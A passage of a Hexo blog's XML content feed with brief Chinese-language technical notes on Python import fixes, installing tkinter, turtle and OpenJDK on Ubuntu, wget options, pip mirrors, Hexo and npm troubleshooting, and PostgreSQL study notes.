    <link href="/2022/08/22/%E8%A7%A3%E5%86%B3ImportError-cannot-import-name-gcd-from-fractions-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/22/%E8%A7%A3%E5%86%B3ImportError-cannot-import-name-gcd-from-fractions-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>好像 Python3.9 把 <code>gcd</code> 函数移入到 <code>math</code> 模块中了, 因此，将:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> fractions <span class="hljs-keyword">import</span> gcd<br></code></pre></td></tr></table></figure><p>改为:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> <span class="hljs-built_in">math</span> <span class="hljs-keyword">import</span> gcd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dist-packages 和 site-packages 的区别</title>
    <link href="/2022/08/22/dist-packages-%E5%92%8C-site-packages-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/08/22/dist-packages-%E5%92%8C-site-packages-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="dist-packages"><a href="#dist-packages" class="headerlink" title="dist-packages"></a>dist-packages</h1><p>当模块从Debian的包管理器下载时，其会被安装至<code>dist-packages</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3.10/</span>dist-packages<br></code></pre></td></tr></table></figure><p>由于<code>easy_install</code>和<code>pip</code>都是从包管理器下载，因此用这两个安装的模块也会到<code>dist-packages</code>.</p><h1 id="site-packages"><a href="#site-packages" class="headerlink" title="site-packages"></a>site-packages</h1><p>从源代码安装Python, 其会使用<code>site-packages</code>目录。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu下安装tkinter</title>
    <link href="/2022/08/22/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85tkinter/"/>
    <url>/2022/08/22/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85tkinter/</url>
    
    <content type="html"><![CDATA[<p>使用命令如下:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install python3-tk<br></code></pre></td></tr></table></figure><p>或者:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install python-tk<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装 turtle 库</title>
    <link href="/2022/08/22/%E5%AE%89%E8%A3%85-turtle-%E5%BA%93/"/>
    <url>/2022/08/22/%E5%AE%89%E8%A3%85-turtle-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>直接通过<code>pip</code>安装会报错.</p><p>先通过<code>wget</code>下载:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> -O turtle-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>.tar.gz https://pypi.tuna.tsinghua.edu.cn/packages/ff/f0/<span class="hljs-number">21</span>a42e9e424d24bdd0e509d5ed3c7dfb8f47d962d9c044dba903b0b4a26f/turtle-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>.tar.gz<br></code></pre></td></tr></table></figure><p>解压后进入文件夹:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> turtle-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">vim</span> setup.py<br></code></pre></td></tr></table></figure><p>修改第40行为:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">except</span> (ValueError, ve):<br></code></pre></td></tr></table></figure><p>也就是加了一个括号。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wget 部分常用参数</title>
    <link href="/2022/08/22/wget-%E9%83%A8%E5%88%86%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/"/>
    <url>/2022/08/22/wget-%E9%83%A8%E5%88%86%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="下载单个文件并重命名"><a href="#下载单个文件并重命名" class="headerlink" title="下载单个文件并重命名"></a>下载单个文件并重命名</h1><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">wget -O <span class="hljs-keyword">new</span><span class="hljs-type">name</span> url<br></code></pre></td></tr></table></figure><h1 id="断电续传，也就是接着上次没下载完的"><a href="#断电续传，也就是接着上次没下载完的" class="headerlink" title="断电续传，也就是接着上次没下载完的"></a>断电续传，也就是接着上次没下载完的</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wget -c url</span><br></code></pre></td></tr></table></figure><h1 id="后台下载"><a href="#后台下载" class="headerlink" title="后台下载"></a>后台下载</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">wget</span> -<span class="hljs-keyword">b</span> url<br></code></pre></td></tr></table></figure><p>查看进度用:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tail <span class="hljs-operator">-f</span> w<span class="hljs-built_in">get-log</span><br></code></pre></td></tr></table></figure><h1 id="下载多个文件"><a href="#下载多个文件" class="headerlink" title="下载多个文件"></a>下载多个文件</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> &gt; filelist.txt<br>url1<br>url2<br>url3<br>url4<br><br><span class="hljs-built_in">wget</span> <span class="hljs-literal">-i</span> filelist.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wget: unable to resolve host address</title>
    <link href="/2022/08/22/wget-unable-to-resolve-host-address/"/>
    <url>/2022/08/22/wget-unable-to-resolve-host-address/</url>
    
    <content type="html"><![CDATA[<p>一般是网络问题。</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu 下 Python 模块的库导入</title>
    <link href="/2022/08/22/ubuntu-%E4%B8%8B-Python-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%BA%93%E5%AF%BC%E5%85%A5/"/>
    <url>/2022/08/22/ubuntu-%E4%B8%8B-Python-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%BA%93%E5%AF%BC%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>pip</code> 安装。</p><p><code>pip</code> 提速:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">mkdir</span> .pip<br><span class="hljs-keyword">cd</span> .pip<br><span class="hljs-keyword">vim</span> pip.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>添加:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-keyword">global</span>]<br>  <span class="hljs-keyword">index</span>-url=https://pypi.tuna.tsinghua.edu.cn/simple<br>[install]<br>  <span class="hljs-keyword">trusted</span>-host=mirrors.aliyun.com<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 小知识点</title>
    <link href="/2022/08/22/Python-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/08/22/Python-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="print-函数"><a href="#print-函数" class="headerlink" title="print() 函数"></a>print() 函数</h1><p>如:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">print</span>(&#x27;The <span class="hljs-built_in">length</span> of <span class="hljs-built_in">%s</span> <span class="hljs-built_in">is</span> %d&#x27; <span class="hljs-symbol">%</span>(s,x))<br></code></pre></td></tr></table></figure><p>这里的<code>%(s,x)</code>，其中<code>%</code>标记转换说明符的开始，<code>(s,x)</code>为转换说明符。</p><p>可以一次输出多个对象:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a, b)</span></span><br></code></pre></td></tr></table></figure><p>可直接输出列表，字典，元组等变量。</p><p>最小字段宽度和精度设置和C语言相同。</p><h1 id="try-…-except"><a href="#try-…-except" class="headerlink" title="try … except"></a>try … except</h1><p>将可能发生错误的语句放在<code>try</code>模块，用<code>except</code>处理异常。</p><p><code>except</code> 可以指定一个专门的异常，若未指定则默认为所有异常。</p><p>每一个<code>try</code>都至少要有一个<code>except</code>.</p><p>可以多分支.</p><p>若使用 <code>try ... except ... finally</code>, <code>finally</code> 部分无论 <code>try</code> 是否捕获错误都会执行。</p><p><code>except</code> 中的 <code>as</code> 应该是设置别名。</p><h1 id="字符串单引号和双引号"><a href="#字符串单引号和双引号" class="headerlink" title="字符串单引号和双引号"></a>字符串单引号和双引号</h1><p>两者皆可。</p><h1 id="range-x-y-z"><a href="#range-x-y-z" class="headerlink" title="range(x, y, z)"></a>range(x, y, z)</h1><p><code>z</code>是步长量。</p><h1 id="转换类型"><a href="#转换类型" class="headerlink" title="转换类型"></a>转换类型</h1><p>如:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">self.R</span> = int(R)<br></code></pre></td></tr></table></figure><h1 id="Python-缩进"><a href="#Python-缩进" class="headerlink" title="Python 缩进"></a>Python 缩进</h1><p>Python 用缩进来区分代码层次。</p><h1 id="m-选项"><a href="#m-选项" class="headerlink" title="-m 选项"></a><code>-m</code> 选项</h1><p>使用 <code>-m</code> 选项时，Python 会把当前工作目录添加到 <code>sys.path</code> 中。</p><h1 id="isinstance-函数"><a href="#isinstance-函数" class="headerlink" title="isinstance() 函数"></a>isinstance() 函数</h1><p>用于判断一个对象是否为一个已知类型。</p><p>语法:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">isinstance</span><span class="hljs-params">(object, classinfo)</span></span> <br></code></pre></td></tr></table></figure><p>返回布尔值。</p><p>和 <code>type()</code> 的区别:</p><ul><li>type() 不考虑继承关系，不会认为子类是一种父类类型</li><li>isinstance() 考虑继承关系，认为子类是一种父类类型</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 极客项目编程</title>
    <link href="/2022/08/22/Python-%E6%9E%81%E5%AE%A2%E9%A1%B9%E7%9B%AE%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/08/22/Python-%E6%9E%81%E5%AE%A2%E9%A1%B9%E7%9B%AE%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="第一部分-热身运动"><a href="#第一部分-热身运动" class="headerlink" title="第一部分 热身运动"></a>第一部分 热身运动</h1><h2 id="第1章-解析iTunes播放列表"><a href="#第1章-解析iTunes播放列表" class="headerlink" title="第1章 解析iTunes播放列表"></a>第1章 解析iTunes播放列表</h2><h3 id="1-1-iTunes-播放列表文件剖析"><a href="#1-1-iTunes-播放列表文件剖析" class="headerlink" title="1.1 iTunes 播放列表文件剖析"></a>1.1 iTunes 播放列表文件剖析</h3><h2 id="第2章-万花尺"><a href="#第2章-万花尺" class="headerlink" title="第2章 万花尺"></a>第2章 万花尺</h2><p><code>turtle</code>模块比较慢。</p><h3 id="2-1-参数方程"><a href="#2-1-参数方程" class="headerlink" title="2.1 参数方程"></a>2.1 参数方程</h3><h4 id="2-1-1-万花尺方程"><a href="#2-1-1-万花尺方程" class="headerlink" title="2.1.1 万花尺方程"></a>2.1.1 万花尺方程</h4><p>大多数计算机程序的角度计算需要弧度。</p><h1 id="第二部分-模拟生命"><a href="#第二部分-模拟生命" class="headerlink" title="第二部分 模拟生命"></a>第二部分 模拟生命</h1><h2 id="第3章-Conway-生命游戏"><a href="#第3章-Conway-生命游戏" class="headerlink" title="第3章 Conway 生命游戏"></a>第3章 Conway 生命游戏</h2><p>类似于 Pac-Man(吃豆子) 在边界的工作方式，如果超出了屏幕的顶部，就会重新在底部出现，如果超出了屏幕的左侧，就会重新在右侧出现。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在 Ubuntu 下安装JDK</title>
    <link href="/2022/08/20/%E5%9C%A8-Ubuntu-%E4%B8%8B%E5%AE%89%E8%A3%85JDK/"/>
    <url>/2022/08/20/%E5%9C%A8-Ubuntu-%E4%B8%8B%E5%AE%89%E8%A3%85JDK/</url>
    
    <content type="html"><![CDATA[<h1 id="安装-Open-JDK"><a href="#安装-Open-JDK" class="headerlink" title="安装 Open JDK"></a>安装 Open JDK</h1><p>添加OpenJDK源:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">sudo<span class="hljs-built_in"> add-apt-repository </span>ppa:openjdk-r/ppa<br>sudo apt-get update<br>sudo apt-get install openjdk-8-jdk<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo deplpy 后404 not found</title>
    <link href="/2022/08/17/hexo-deplpy-%E5%90%8E404-not-found/"/>
    <url>/2022/08/17/hexo-deplpy-%E5%90%8E404-not-found/</url>
    
    <content type="html"><![CDATA[<p>在<code>hexo d</code>之后，Github上面的<code>CNAME</code>文件消失了，重新添加即可，最好是直接写在Blog所在本地目录中。</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在hexo中添加图片</title>
    <link href="/2022/08/17/%E5%9C%A8hexo%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87/"/>
    <url>/2022/08/17/%E5%9C%A8hexo%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<p>将图片放入<code>/source/img</code>中, 先安装一个插件, 才能用 markdown 的格式添加图片:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">cnpm install hexo-asset-<span class="hljs-built_in">image</span> --<span class="hljs-built_in">save</span><br></code></pre></td></tr></table></figure><p>还需确认<code>_config.yml</code>文件中<code>post_asset_folder: true</code>.</p><p>插入格式为:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">![alt](<span class="hljs-regexp">/img/</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown 插入图片</title>
    <link href="/2022/08/17/Markdown-%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
    <url>/2022/08/17/Markdown-%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<p>语法:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">!<span class="hljs-selector-attr">[显示失败时显示的文字]</span>(文件的本地路径)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Github Pages 和个人域名绑定</title>
    <link href="/2022/08/17/Github-Pages-%E5%92%8C%E4%B8%AA%E4%BA%BA%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/"/>
    <url>/2022/08/17/Github-Pages-%E5%92%8C%E4%B8%AA%E4%BA%BA%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>添加两条记录.<br><img src="/img/add_records.png" alt="adding records1"><br><img src="/img/add_records1.png" alt="adding records2"></p><p>记录值是输入域名.</p><p>在Github Pages 中添加。在添加了记录之后, 添加可能还是会失败, 等待一段时间就可以成功。</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo fluid 主题 ERROR Script load failed 问题</title>
    <link href="/2022/08/17/hexo-fluid-%E4%B8%BB%E9%A2%98-ERROR-Script-load-failed-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/17/hexo-fluid-%E4%B8%BB%E9%A2%98-ERROR-Script-load-failed-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>首先通过 cnpm 重新安装 fluid 主题.</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>修改 hexo 博客目录中的 <code>_config.yml</code>:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theme:</span> fluid<br><span class="hljs-symbol">language:</span> <span class="hljs-built_in">zh</span>-CN<br></code></pre></td></tr></table></figure><p>遇到 <code>peerDependencies WARNING</code>. 看看缺什么，然后顺着安装.</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>npm ERR! Cannot read properties of null()</title>
    <link href="/2022/08/16/npm-ERR-Cannot-read-properties-of-null/"/>
    <url>/2022/08/16/npm-ERR-Cannot-read-properties-of-null/</url>
    
    <content type="html"><![CDATA[<p>使用<code>npn install hexo-util --save</code> 时报这个错.</p><p>使用<code>npm cache clear --force</code> 时报 <code>npm WARN using --force Recommended protections disabled</code></p><p>用<code>npm cache verify</code> 检查 cache 是否正常工作.</p><p>我的 npm 当前版本为 8.11.0.</p><p>降低版本:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">npm</span> install npm@<span class="hljs-number">6</span>.<span class="hljs-number">14</span>.<span class="hljs-number">10</span> -g<br></code></pre></td></tr></table></figure><p>若报错，则使用:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cnpm</span> install npm@<span class="hljs-number">6</span>.<span class="hljs-number">14</span>.<span class="hljs-number">10</span> -g<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>npm install 报错</title>
    <link href="/2022/08/16/npm-install-%E6%8A%A5%E9%94%99/"/>
    <url>/2022/08/16/npm-install-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>cnpm</code> 下载.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用 nrm</title>
    <link href="/2022/08/16/%E4%BD%BF%E7%94%A8-nrm/"/>
    <url>/2022/08/16/%E4%BD%BF%E7%94%A8-nrm/</url>
    
    <content type="html"><![CDATA[<p>查询已有源:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nrm <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>切换源:</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">npm <span class="hljs-keyword">use</span> &lt;<span class="hljs-keyword">name</span>&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装hexo fluid主题</title>
    <link href="/2022/08/16/%E5%AE%89%E8%A3%85hexo-fluid%E4%B8%BB%E9%A2%98/"/>
    <url>/2022/08/16/%E5%AE%89%E8%A3%85hexo-fluid%E4%B8%BB%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>hexo 的版本在 5.0.0 以上，直接通过 npm 安装:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>然后将 <code>_config.yml</code>的内容复制到 <code>_config.fluid.yml</code> 中。</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu 22.04 无法调节亮度</title>
    <link href="/2022/08/14/Ubuntu-22-04-%E6%97%A0%E6%B3%95%E8%B0%83%E8%8A%82%E4%BA%AE%E5%BA%A6/"/>
    <url>/2022/08/14/Ubuntu-22-04-%E6%97%A0%E6%B3%95%E8%B0%83%E8%8A%82%E4%BA%AE%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<p>进入BIOS, 将 Graphic Device 中的 Discrete Graphic 改为 Dynamic Graphics.</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL基础教程 Notes</title>
    <link href="/2022/08/10/SQL%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B-Notes/"/>
    <url>/2022/08/10/SQL%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第0章-绪论-搭建SQL的学习环境"><a href="#第0章-绪论-搭建SQL的学习环境" class="headerlink" title="第0章 绪论 搭建SQL的学习环境"></a>第0章 绪论 搭建SQL的学习环境</h1><h2 id="0-1-PostgreSQL的安装和连接设置"><a href="#0-1-PostgreSQL的安装和连接设置" class="headerlink" title="0-1 PostgreSQL的安装和连接设置"></a>0-1 PostgreSQL的安装和连接设置</h2><p>在命令行使用postgreSQL需要登录 postgres 账户:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo su postgres</span><br></code></pre></td></tr></table></figure><p>进入 sql 命令行执行:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>psql<br></code></pre></td></tr></table></figure><p>postgres 账户的目录在 &#x2F;var&#x2F;lib&#x2F;postgresql.</p><h2 id="官方Ubuntu上使用postgresql教程"><a href="#官方Ubuntu上使用postgresql教程" class="headerlink" title="官方Ubuntu上使用postgresql教程"></a>官方Ubuntu上使用postgresql教程</h2><p><a href="https://ubuntu.com/server/docs/databases-postgresql">reference</a></p><p>配置文件所在位置: &#x2F;etc&#x2F;postgresql&#x2F;<version>&#x2F;main, 目录中. 我的在: &#x2F;etc&#x2F;postgresql&#x2F;14&#x2F;main.</p><p>连接 default PostgreSQL template database:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> -u postgres psql template1<br></code></pre></td></tr></table></figure><p>To configure the password for the user postgres:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> postgres <span class="hljs-keyword">with</span> <span class="hljs-keyword">encrypted</span> <span class="hljs-keyword">password</span> <span class="hljs-string">&#x27;your_password&#x27;</span>;<br></code></pre></td></tr></table></figure><p>Restarting the PostgreSQL service to initialize the new configuration:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">sudo systemctl <span class="hljs-built_in">restart</span> postgresql.service<br></code></pre></td></tr></table></figure><h2 id="0-1"><a href="#0-1" class="headerlink" title="0-1"></a>0-1</h2><p><code>listen_addresses = &#39;*&#39;</code> 意味着允许所有远程主机进行连接。<br><code>listen_addresses = &#39;localhost&#39;</code> 意味着只允许本地机器进行连接。</p><h2 id="0-2-通过PostgreSQL执行SQL语句"><a href="#0-2-通过PostgreSQL执行SQL语句" class="headerlink" title="0-2 通过PostgreSQL执行SQL语句"></a>0-2 通过PostgreSQL执行SQL语句</h2><p><code>psql</code> 是 PostpreSQL 提供的通过命令行执行 SQL 语句的工具。</p><p><code>psql</code> 会把 SQL 语句发送给 PostgreSQL, 然后再将接收到的执行结果显示出来。</p><p>“;” 是 SQL 的结束符， 如果没有输入的话，即使按下回车键，SQL语句也不会执行。</p><p>数据库的名称只能是小写字母.</p><h3 id="创建学习用的数据库"><a href="#创建学习用的数据库" class="headerlink" title="创建学习用的数据库"></a>创建学习用的数据库</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> shop;<br></code></pre></td></tr></table></figure><p><code>postgres</code> 是安装 PostgreSQL 时自动创建的示例数据库。</p><h3 id="连接学习用的数据库-登录"><a href="#连接学习用的数据库-登录" class="headerlink" title="连接学习用的数据库(登录)"></a>连接学习用的数据库(登录)</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">psql -U postgres -d shop</span><br></code></pre></td></tr></table></figure><p>“-d shop” 是指定 “数据库shop” 的意思。</p><p>“-U username” 是 connect to the database as the user <code>username</code> instead of the default. </p><h1 id="第1章-数据库和SQL"><a href="#第1章-数据库和SQL" class="headerlink" title="第1章 数据库和SQL"></a>第1章 数据库和SQL</h1><h2 id="1-1-数据库是什么"><a href="#1-1-数据库是什么" class="headerlink" title="1-1 数据库是什么"></a>1-1 数据库是什么</h2><p>数据库(Database, DB)是将大量数据保存起来，通过计算机加工而成的可以进行高效访问的数据集合。</p><p>用来管理数据库的计算机系统称为<mark>Database Management System, DBMS</mark>.</p><p>系统使用者通常无法直接接触到数据库。</p><h3 id="DSMS的种类"><a href="#DSMS的种类" class="headerlink" title="DSMS的种类"></a>DSMS的种类</h3><p>通过数据的保存格式(数据库的种类)来分类，现阶段主要有以下5种类型:</p><ul><li>Hierarchical Database, HDB</li><li>Relational Database, RDB</li><li>Object Oriented Database, OODB</li><li>XML Database, XMLDB</li><li>Key-Value Store, KVS<br>使用SQL语言的数据库管理系统，也就是关系数据库管理系统(RDBMS).</li></ul><h2 id="1-2-数据库的结构"><a href="#1-2-数据库的结构" class="headerlink" title="1-2 数据库的结构"></a>1-2 数据库的结构</h2><h3 id="RDBMS-的常见系统结构"><a href="#RDBMS-的常见系统结构" class="headerlink" title="RDBMS 的常见系统结构"></a>RDBMS 的常见系统结构</h3><p>最常见的是客户端&#x2F;服务器类型(C&#x2F;S类型).</p><p>RDBMS 既可以和其客户端安装在同一台计算机上，也可以分别安装在不同的计算机上。</p><h3 id="表的结构"><a href="#表的结构" class="headerlink" title="表的结构"></a>表的结构</h3><p>用来管理数据的二维表在关系数据库中简称为<mark>表</mark>.</p><p>表存储在由 RDBMS 管理的数据库中， 一个数据库中可以存储多个表。</p><p>根据 SQL 语句的内容返回的数据同样必须是二维表的形式。</p><p>表的列（垂直方向）称为字段，它代表了保存在表中的数据项目。</p><p>表的行（水平方向）称为记录，它相当于一条数据。</p><p><mark>关系数据库必须以行为单位进行数据读写。</mark></p><p>行和列交汇的方格称为单元格。一个单元格中只<br>能输入一个数据。单元格只是这本书特有的表述方式.</p><h2 id="1-3-SQL-概要"><a href="#1-3-SQL-概要" class="headerlink" title="1-3 SQL 